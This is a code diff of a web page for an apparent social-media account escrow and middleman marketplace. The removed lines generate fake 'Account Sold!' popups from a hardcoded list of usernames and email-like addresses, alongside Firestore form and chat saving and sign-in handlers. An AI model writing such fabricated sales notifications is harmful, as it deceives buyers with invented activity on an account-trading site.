-                { platform: "TikTok", user: "Kenji_Sato_JP", country: "🇯🇵 Japan" },
-                { platform: "Facebook", user: "Yuki.Tanaka.tokyo@gmail.com", country: "🇯🇵 Japan" },
-                { platform: "TikTok", user: "MinThant_MM", country: "🇲🇲 Myanmar" },
-                { platform: "Facebook", user: "EiMonSu.official@gmail.com", country: "🇲🇲 Myanmar" },
-                { platform: "TikTok", user: "Sakura_Gaming_99", country: "🇯🇵 Japan" },
-                { platform: "Facebook", user: "Hiroshi.Yamamoto.jp@gmail.com", country: "🇯🇵 Japan" },
-                { platform: "TikTok", user: "ZinMarAung_11", country: "🇲🇲 Myanmar" },
-                { platform: "Facebook", user: "KyawSwarMin@gmail.com", country: "🇲🇲 Myanmar" },
-                { platform: "TikTok", user: "Daiki_Suzuki_22", country: "🇯🇵 Japan" },
-                { platform: "Facebook", user: "Mei.Watanabe.osaka@gmail.com", country: "🇯🇵 Japan" },
-                { platform: "TikTok", user: "SuMyatMon_MM", country: "🇲🇲 Myanmar" },
-                { platform: "Facebook", user: "HlaingBwar.acc@gmail.com", country: "🇲🇲 Myanmar" },
-                { platform: "TikTok", user: "Riku_Takahashi_7", country: "🇯🇵 Japan" },
-                { platform: "Facebook", user: "Aoi.Nakamura.kyoto@gmail.com", country: "🇯🇵 Japan" },
-                { platform: "TikTok", user: "NayLinHtike_55", country: "🇲🇲 Myanmar" },
-                { platform: "Facebook", user: "WuttYeeHtun@gmail.com", country: "🇲🇲 Myanmar" },
-                { platform: "TikTok", user: "SiamTrader_TH", country: "🇹🇭 Thailand" },
-                { platform: "Facebook", user: "BangkokVault.th@gmail.com", country: "🇹🇭 Thailand" },
-                { platform: "TikTok", user: "SG_LionTrades", country: "🇸🇬 Singapore" },
-                { platform: "Facebook", user: "KLEscrowStore@gmail.com", country: "🇲🇾 Malaysia" },
-                { platform: "TikTok", user: "SaigonGamer_VN", country: "🇻🇳 Vietnam" },
-                { platform: "Facebook", user: "IndoAccountHub@gmail.com", country: "🇮🇩 Indonesia" },
-                { platform: "TikTok", user: "BeijingAccDepot", country: "🇨🇳 China" },
-                { platform: "Facebook", user: "ShanghaiGaming.cn@gmail.com", country: "🇨🇳 China" },
-                { platform: "TikTok", user: "HtetAungKyaw_77", country: "🇲🇲 Myanmar" },
-                { platform: "Facebook", user: "NanMyaing.acc@gmail.com", country: "🇲🇲 Myanmar" }
-            ];
-
-            const salesContainer = document.getElementById('salesPopupContainer');
-
-            function createSalesPopup() {
-                const randomAcc = accountDatabase[Math.floor(Math.random() * accountDatabase.length)];
-                const card = document.createElement('div');
-                card.className = 'sales-popup-card';
-                card.innerHTML = `
-                    <div class="sales-popup-header">
-                        <span>🔥 Account Sold!</span>
-                        <span class="sales-popup-time">Just now</span>
-                    </div>
-                    <div><b>${randomAcc.platform}:</b> @${randomAcc.user}</div>
-                    <div style="font-size: 0.8rem; color: #64748b; margin-top: 2px;">Verified Buyer from ${randomAcc.country}</div>
-                `;
-                salesContainer.appendChild(card);
-                setTimeout(() => card.classList.add('show'), 50);
-                setTimeout(() => {
-                    card.classList.remove('show');
-                    setTimeout(() => card.remove(), 400);
-                }, 4000);
-            }
-
-            function triggerRandomSalesBatch() {
-                const count = Math.floor(Math.random() * 5) + 1; // 1 to 5 at a time
-                for (let i = 0; i < count; i++) {
-                    setTimeout(() => createSalesPopup(), i * 700);
-                }
-                const nextInterval = Math.random() * 6000 + 6000;
-                setTimeout(triggerRandomSalesBatch, nextInterval);
-            }
-            setTimeout(triggerRandomSalesBatch, 2500);
-
-            // Navigation tab switching for local tabs (like Contact Us)
-            const contactTabLink = document.querySelector('.nav-link[data-tab="contactPage"]');
-            const pageTabs = document.querySelectorAll('.page-tab');
-
-            if (contactTabLink) {
-                contactTabLink.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
-                    contactTabLink.classList.add('active');
-
-                    pageTabs.forEach(p => p.classList.remove('active'));
-                    document.getElementById('contactPage').classList.add('active');
-                    window.scrollTo({ top: 0, behavior: 'smooth' });
-                });
-            }
-
-            // Handle Escrow Form Submission
+            // Form Submit
             const escrowForm = document.getElementById('escrowForm');
             const confirmationModal = document.getElementById('confirmationModal');
             const closeModalBtn = document.getElementById('closeModalBtn');
 
-            escrowForm.addEventListener('submit', async (e) => {
+            escrowForm.addEventListener('submit', (e) => {
                 e.preventDefault();
-                const formData = new FormData(escrowForm);
-                const data = Object.fromEntries(formData.entries());
-
-                try {
-                    await saveEscrowSubmission(data);
-                } catch (err) {
-                    console.error('Firestore submission save error:', err);
-                }
                 confirmationModal.classList.add('active');
             });
 
@@ -876,7 +725,7 @@
                 escrowForm.reset();
             });
 
-            // Chat Widget Interactions
+            // Chat Widget
             const chatToggleBtn = document.getElementById('chatToggleBtn');
             const chatBox = document.getElementById('chatBox');
             const chatCloseBtn = document.getElementById('chatCloseBtn');
@@ -889,134 +738,17 @@
             chatSendBtn.addEventListener('click', sendMsg);
             chatInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMsg(); });
 
-            async function sendMsg() {
+            function sendMsg() {
                 const text = chatInput.value.trim();
                 if (!text) return;
-
                 const userMsg = document.createElement('div');
                 userMsg.className = 'chat-msg outgoing';
                 userMsg.textContent = text;
                 chatMessages.appendChild(userMsg);
                 chatInput.value = '';
                 chatMessages.scrollTop = chatMessages.scrollHeight;
-
-                try {
-                    await saveChatMessage(text);
-                } catch (err) {
-                    console.error('Firestore chat save error:', err);
-                }
             }
-
-            // Auth UI & Handlers
-            const navSignInBtn = document.getElementById('navSignInBtn');
-            const authModal = document.getElementById('authModal');
-            const closeAuthModal = document.getElementById('closeAuthModal');
-            const anonLoginBtn = document.getElementById('anonLoginBtn');
-            const emailAuthForm = document.getElementById('emailAuthForm');
-            const switchAuthModeBtn = document.getElementById('switchAuthModeBtn');
-            const authModalTitle = document.getElementById('authModalTitle');
-            const authSubmitBtn = document.getElementById('authSubmitBtn');
-            const toggleAuthModeText = document.getElementById('toggleAuthModeText');
-
-            let isSignUpMode = false;
-
-            navSignInBtn.addEventListener('click', (e) => { e.preventDefault(); authModal.classList.add('active'); });
-            closeAuthModal.addEventListener('click', () => authModal.classList.remove('active'));
-
-            switchAuthModeBtn.addEventListener('click', () => {
-                isSignUpMode = !isSignUpMode;
-                const currentLang = document.getElementById('languageSelector').value;
-                const t = translations[currentLang] || translations.en;
-                authModalTitle.textContent = isSignUpMode ? (currentLang === 'ja' ? 'アカウントを作成' : currentLang === 'zh' ? '创建账户' : currentLang === 'th' ? 'สร้างบัญชี' : currentLang === 'my' ? 'အကောင့်အသစ်ဖွင့်ရန်' : 'Create an Account') : t.authTitle;
-                authSubmitBtn.textContent = isSignUpMode ? (currentLang === 'ja' ? '登録' : currentLang === 'zh' ? '注册' : currentLang === 'th' ? 'สมัครสมาชิก' : currentLang === 'my' ? 'စာရင်းသွင်းမည်' : 'Sign Up') : t.signIn;
-                toggleAuthModeText.textContent = isSignUpMode ? (currentLang === 'ja' ? 'すでにアカウントをお持ちですか？' : currentLang === 'zh' ? '已有账户？' : currentLang === 'th' ? 'มีบัญชีอยู่แล้วใช่ไหม?' : currentLang === 'my' ? 'အကောင့်ရှိပြီးသားလား?' : 'Already have an account?') : t.noAccount;
-                switchAuthModeBtn.textContent = isSignUpMode ? (currentLang === 'ja' ? 'サインイン' : currentLang === 'zh' ? '登录' : currentLang === 'th' ? 'เข้าสู่ระบบ' : currentLang === 'my' ? 'အကောင့်ဝင်ရန်' : 'Sign in') : t.signUp;
-            });
-
-            anonLoginBtn.addEventListener('click', async () => {
-                try {
-                    await loginAnonymous();
-                    alert("Signed in successfully as Guest!");
-                    authModal.classList.remove('active');
-                } catch (err) {
-                    alert("Anonymous Sign-In Error: " + err.message);
-                }
-            });
-
-            emailAuthForm.addEventListener('submit', async (e) => {
-                e.preventDefault();
-                const email = document.getElementById('authEmail').value;
-                const password = document.getElementById('authPassword').value;
-
-                try {
-                    if (isSignUpMode) {
-                        await registerEmail(email, password);
-                        alert("Account created successfully!");
-                    } else {
-                        await loginEmail(email, password);
-                        alert("Signed in successfully!");
-                    }
-                    authModal.classList.remove('active');
-                    emailAuthForm.reset();
-                } catch (err) {
-                    alert("Auth error: " + err.message);
-                }
-            });
-
-            trackAuth((user) => {
-                if (user) {
-                    navSignInBtn.textContent = user.isAnonymous ? "Guest User" : (user.displayName || user.email.split('@')[0]);
-                } else {
-                    navSignInBtn.textContent = translations[document.getElementById('languageSelector').value]?.signIn || "Sign In";
-                }
-            });
-
-            // Live Admin Customization Listener (Syncs Titles, Banners, Theme, Deposit/Fee Math & Section Reordering)
-            onSnapshot(doc(db, "site_config", "main"), (docSnap) => {
-                if (docSnap.exists()) {
-                    const data = docSnap.data();
-                    
-                    if (data.pageTitle) {
-                        const titleEl = document.querySelector('.page-title');
-                        if (titleEl) titleEl.textContent = data.pageTitle;
-                    }
-                    if (data.emailBanner) {
-                        const bannerEl = document.querySelector('.email-change-banner');
-                        if (bannerEl) bannerEl.textContent = data.emailBanner;
-                    }
-                    if (data.gradientColor1 && data.gradientColor2) {
-                        document.documentElement.style.setProperty(
-                            '--gradient-primary', 
-                            `linear-gradient(135deg, ${data.gradientColor1} 0%, ${data.gradientColor2} 50%, #ec4899 100%)`
-                        );
-                    }
-
-                    // Update Deposit & Fee Payout Calculation
-                    if (data.depositAmount !== undefined && data.feePercent !== undefined) {
-                        const deposit = data.depositAmount;
-                        const feePercent = data.feePercent;
-                        const currency = data.currencyUnit || 'Kyats';
-                        const feeAmount = (deposit * feePercent) / 100;
-                        const netPayout = deposit - feeAmount;
-
-                        document.getElementById('displayDepositAmt').textContent = `${deposit.toLocaleString()} ${currency}`;
-                        document.getElementById('displayFeeLabel').textContent = `Middle Man Fee (${feePercent}%)`;
-                        document.getElementById('displayFeeAmt').textContent = `- ${feeAmount.toLocaleString()} ${currency}`;
-                        document.getElementById('displayTotalPayout').textContent = `${netPayout.toLocaleString()} ${currency}`;
-                    }
-
-                    // Apply Drag & Drop Section Order
-                    if (data.sectionOrder && Array.isArray(data.sectionOrder)) {
-                        const wrapper = document.getElementById('siteSectionsWrapper');
-                        data.sectionOrder.forEach(sectionId => {
-                            const sectionEl = wrapper.querySelector(`[data-section-id="${sectionId}"]`);
-                            if (sectionEl) wrapper.appendChild(sectionEl);
-                        });
-                    }
-                }
-            });
         });
     </script>
-    <script src="builder.js"></script>
 </body>
 </html>
